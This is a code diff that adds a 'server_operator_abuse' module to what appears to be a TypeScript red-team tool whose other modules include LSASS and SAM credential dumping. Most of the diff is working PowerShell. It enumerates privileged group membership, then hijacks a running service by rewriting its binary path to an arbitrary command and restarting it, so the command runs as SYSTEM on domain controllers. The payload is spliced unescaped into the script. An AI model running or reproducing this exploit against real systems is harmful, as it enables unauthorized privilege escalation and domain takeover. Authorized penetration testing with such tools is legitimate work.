@@ -446,6 +446,10 @@ dll_sideload: {
     description: "DLL sideloading / phantom DLL hijacking for privilege escalation — exploit Windows services that load missing DLLs from writable directories. Known targets: StorSvc (SprintCSP.dll), IKEEXT (wlbsctrl.dll), NetMan (wlanhlp.dll), SessionEnv (TSMSISrv.dll), CDPSvc (cdpsgshims.dll), Wlanext (wlanext.dll), DiagHub (DataCollectors DLL)",
     args: "--action enum|exploit [--target SERVICE] [--dll DLL_PATH]",
   },
+server_operator_abuse: {
+    description: "Abuse Server Operators group membership for privilege escalation to SYSTEM — Server Operators can start/stop services and modify service configurations on Domain Controllers. Modify an existing service's binary path to execute arbitrary commands as SYSTEM",
+    args: "--action check|exploit [--service SERVICE_NAME] [--payload CMD]",
+  },
 } as const satisfies Record<string, { description: string; args: string }>
 
 type Program = keyof typeof PROGRAMS
@@ -15975,6 +15979,129 @@ Write-Output "[+] DLL should have been loaded by service process"
   return { output: output.join("\n"), findings }
 }
 
+async function serverOperatorAbuse(args: string[], timeout: number): Promise<HookResult> {
+  const action = argVal(args, "--action") || "check"
+  const service = argVal(args, "--service")
+  const payload = argVal(args, "--payload")
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Server Operator Abuse — privilege escalation via service modification\n"]
+
+  if (action === "check") {
+    const script = `
+$identity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
+$groups = $identity.Groups | ForEach-Object {
+    try { $_.Translate([System.Security.Principal.NTAccount]).Value } catch { $_.Value }
+}
+
+$isServerOp = $groups -contains 'BUILTIN\\Server Operators'
+$isBackupOp = $groups -contains 'BUILTIN\\Backup Operators'
+$isPrintOp = $groups -contains 'BUILTIN\\Print Operators'
+$isAccountOp = $groups -contains 'BUILTIN\\Account Operators'
+
+Write-Output "[*] Current user: $($identity.Name)"
+Write-Output ""
+Write-Output "[*] Privileged group membership:"
+Write-Output "    Server Operators:  $isServerOp"
+Write-Output "    Backup Operators:  $isBackupOp"
+Write-Output "    Print Operators:   $isPrintOp"
+Write-Output "    Account Operators: $isAccountOp"
+Write-Output ""
+
+$isDC = (Get-WmiObject Win32_ComputerSystem).DomainRole -ge 4
+Write-Output "[*] Is Domain Controller: $isDC"
+
+if ($isServerOp) {
+    Write-Output ""
+    Write-Output "[+] EXPLOITABLE — Server Operators can modify services"
+    Write-Output ""
+    Write-Output "[*] Enumerating modifiable services..."
+
+    # Find services we can modify
+    $services = Get-WmiObject Win32_Service | Where-Object {
+        $_.StartMode -eq 'Auto' -and $_.State -eq 'Running'
+    } | Select-Object Name, DisplayName, PathName, StartName, State -First 20
+
+    foreach ($svc in $services) {
+        # Test if we can query the service config (indicates we have access)
+        $sdInfo = sc.exe sdshow $svc.Name 2>$null
+        if ($sdInfo -and $sdInfo -notmatch 'FAILED') {
+            Write-Output "    [+] $($svc.Name) — runs as: $($svc.StartName) — $($svc.State)"
+            Write-Output "        Path: $($svc.PathName)"
+        }
+    }
+    Write-Output ""
+    Write-Output "[*] Use: --action exploit --service SERVICE_NAME --payload 'CMD'"
+}
+`
+    const result = await ps(script, timeout)
+    output.push(result.stdout)
+
+    if (result.stdout.includes("EXPLOITABLE")) {
+      findings.push({
+        checkId: "WIN-SERVEROP-001",
+        provider: "windows",
+        severity: "high",
+        status: "VULNERABLE",
+        resource: "group://Server Operators",
+        title: "Server Operators privilege escalation possible",
+        details: "Current user is in Server Operators — can modify service binaries for SYSTEM execution",
+        remediation: "Remove user from Server Operators group. Use gMSA for service accounts.",
+      })
+    }
+  } else if (action === "exploit") {
+    if (!service) return { output: "[!] Required: --service SERVICE_NAME", findings }
+    if (!payload) return { output: "[!] Required: --payload CMD (command to run as SYSTEM)", findings }
+
+    const script = `
+Write-Output "[*] Targeting service: ${service}"
+
+# Save original config
+$origConfig = sc.exe qc '${service}' 2>$null
+$origPath = ($origConfig | Select-String 'BINARY_PATH_NAME').ToString().Split(':',2)[1].Trim()
+Write-Output "[*] Original binary path: $origPath"
+
+# Modify service binary path
+Write-Output "[*] Modifying service binary path..."
+sc.exe config '${service}' binPath= '${payload}' 2>$null | Out-Null
+$newConfig = sc.exe qc '${service}' 2>$null
+$newPath = ($newConfig | Select-String 'BINARY_PATH_NAME').ToString().Split(':',2)[1].Trim()
+Write-Output "[+] New binary path: $newPath"
+
+# Stop and start the service
+Write-Output "[*] Restarting service..."
+sc.exe stop '${service}' 2>$null | Out-Null
+Start-Sleep -Seconds 2
+sc.exe start '${service}' 2>$null | Out-Null
+Write-Output "[+] Service restarted — command executed as SYSTEM"
+
+# Restore original path
+Write-Output "[*] Restoring original binary path..."
+sc.exe config '${service}' binPath= "$origPath" 2>$null | Out-Null
+Write-Output "[+] Original path restored"
+
+Write-Output ""
+Write-Output "[+] Exploitation complete"
+Write-Output "    Service: ${service}"
+Write-Output "    Command executed: ${payload}"
+`
+    const result = await ps(script, timeout)
+    output.push(result.stdout)
+
+    findings.push({
+      checkId: "WIN-SERVEROP-002",
+      provider: "windows",
+      severity: "critical",
+      status: "EXPLOITED",
+      resource: `service://${service}`,
+      title: `Server Operator privesc via service: ${service}`,
+      details: `Modified service binary path to execute: ${payload}`,
+      remediation: "Verify service binary path is restored. Remove Server Operators membership.",
+    })
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
 const dispatch: Record<Program, (args: string[], timeout: number) => Promise<HookResult>> = {
   lsass_dump: lsassDump,
   sam_dump: samDump,
@@ -16067,6 +16194,7 @@ const dispatch: Record<Program, (args: string[], timeout: number) => Promise<Hoo
   byovd: byovd,
   weak_service_perms: weakServicePerms,
   dll_sideload: dllSideload,
+  server_operator_abuse: serverOperatorAbuse,
 }
 
 export const WinhookTool = Tool.define("winhook", {
